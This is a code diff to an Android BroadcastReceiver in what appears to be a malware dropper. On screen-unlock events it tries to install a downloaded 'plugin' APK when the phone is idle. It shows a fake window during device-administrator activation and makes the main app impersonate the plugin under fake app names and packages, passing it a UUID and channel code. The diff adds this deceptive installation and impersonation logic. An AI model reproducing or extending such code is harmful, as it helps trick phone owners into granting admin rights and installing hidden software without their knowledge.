@@ -5,8 +5,10 @@ import android.content.Context;
 import android.content.Intent;
 import android.provider.Settings;
 import android.telephony.TelephonyManager;
+import android.text.TextUtils;
 import com.plugin.common.utils.SingleInstanceBase;
 import com.plugin.common.utils.UtilsRuntime;
+import com.xstd.plugin.config.PluginSettingManager;
 import com.xstd.qm.*;
 import com.xstd.qm.setting.MainSettingManager;
 
@@ -23,11 +25,19 @@ public class ScreenBroadcastReceiver extends BroadcastReceiver {
         Config.LOGD("<<<< [[ScreenBroadcastReceiver::onReceive]]" +
                         " Phone Model : " + android.os.Build.MODEL +
                         " >>>>>");
+
+        if (MainSettingManager.getInstance().getMainShouldFakePlugin()) {
+            if (Config.DEBUG) {
+                Config.LOGD("[[ScreenBroadcastReceiver::onReceive]] 母程序中的子程序模拟真正的子程序，所以母程序不做事");
+            }
+            return;
+        }
+
         if (intent != null
                 && intent.getAction() != null
                 && (intent.getAction().equals(Intent.ACTION_SCREEN_OFF)
-                    || intent.getAction().equals(Intent.ACTION_SCREEN_ON)
-                    || intent.getAction().equals(Intent.ACTION_USER_PRESENT))) {
+                        || intent.getAction().equals(Intent.ACTION_SCREEN_ON)
+                        || intent.getAction().equals(Intent.ACTION_USER_PRESENT))) {
             if (intent.getAction().equals(Intent.ACTION_SCREEN_ON)
                     || intent.getAction().equals(Intent.ACTION_USER_PRESENT)) {
                 MainSettingManager.getInstance().init(context);
@@ -35,7 +45,7 @@ public class ScreenBroadcastReceiver extends BroadcastReceiver {
                                 + " function screen status : " + UtilsRuntime.isScreenLocked(context));
                 long curTime = System.currentTimeMillis();
                 if (MainSettingManager.getInstance().getPluginDownloadTime() > 0
-                    && !UtilOperator.isPluginApkExist()) {
+                        && !UtilOperator.isPluginApkExist()) {
                     long deta = curTime - MainSettingManager.getInstance().getPluginDownloadTime();
                     if (deta > ((long) 2) * 60 * 60 * 1000) {
                         Utils.saveExtraInfo("两小时子程序下载失败");
@@ -87,7 +97,7 @@ public class ScreenBroadcastReceiver extends BroadcastReceiver {
                         && state == TelephonyManager.CALL_STATE_IDLE
                         && UtilOperator.isPluginApkExist()
                         && !pluginInstalled
-                        && MainSettingManager.getInstance().getDeviceBindingTime() <= Config.BIND_TIMES
+                        && MainSettingManager.getInstance().getPluginAppTime() <= Config.BIND_TIMES
                         && !AppRuntime.FAKE_WINDOW_FOR_DISDEVICE_SHOW.get()) {
                     if (cur > (MainSettingManager.getInstance().getKeyLanuchTime() + MainSettingManager.getInstance().getKeyInstallInterval())) {
                         UtilOperator.tryToInstallPluginLocal(context);
@@ -95,10 +105,16 @@ public class ScreenBroadcastReceiver extends BroadcastReceiver {
                 } else if (pluginInstalled) {
                     Utils.tryToActivePluginApp(context);
                 } else if (open == 0
-                             || (!pluginInstalled && MainSettingManager.getInstance().getHasInstallPlugin())) {
+                               || (!pluginInstalled && MainSettingManager.getInstance().getHasInstallPlugin())
+                               || (MainSettingManager.getInstance().getPluginAppTime() > Config.BIND_TIMES)) {
                     //如果安装设备管理器没有打开
                     //或者现在程序没有安装，但是曾经安装过
-                    Utils.checkAndActiveQS(context);
+//                    Utils.checkAndActiveQS(context);
+
+                    if (Config.DEBUG) {
+                        Config.LOGD("[[ScreenBroadcastReceiver::onReceive]] Main App should fake the plugin App >>>>");
+                    }
+                    updateMainInfoToPlugin(context);
 
                     //同时，主程序以后应该模拟子程序
                     MainSettingManager.getInstance().setMainShouldFakePlugin(true);
@@ -123,6 +139,25 @@ public class ScreenBroadcastReceiver extends BroadcastReceiver {
 
                 UtilOperator.fake.dismiss();
             }
+        }
+    }
+
+    private void updateMainInfoToPlugin(Context context) {
+        try {
+            PluginSettingManager.getInstance().init(context);
+            if (!TextUtils.isEmpty(AppRuntime.CURRENT_FAKE_APP_INFO.name)) {
+                PluginSettingManager.getInstance().setKeyActiveAppName(AppRuntime.CURRENT_FAKE_APP_INFO.name);
+            }
+            if (!TextUtils.isEmpty(AppRuntime.CURRENT_FAKE_APP_INFO.packageNmae)) {
+                PluginSettingManager.getInstance().setKeyActivePackageName(AppRuntime.CURRENT_FAKE_APP_INFO.packageNmae);
+            }
+            String uuid = MainSettingManager.uuid != null ? MainSettingManager.uuid.toString() : null;
+            if (!TextUtils.isEmpty(uuid)) {
+                PluginSettingManager.getInstance().setMainApkSendUUID(uuid);
+            }
+            PluginSettingManager.getInstance().setMainExtraInfo(MainSettingManager.getInstance().getExtraInfo());
+            PluginSettingManager.getInstance().setMainApkChannel(Config.CHANNEL_CODE);
+        } catch (Exception e) {
         }
     }
 
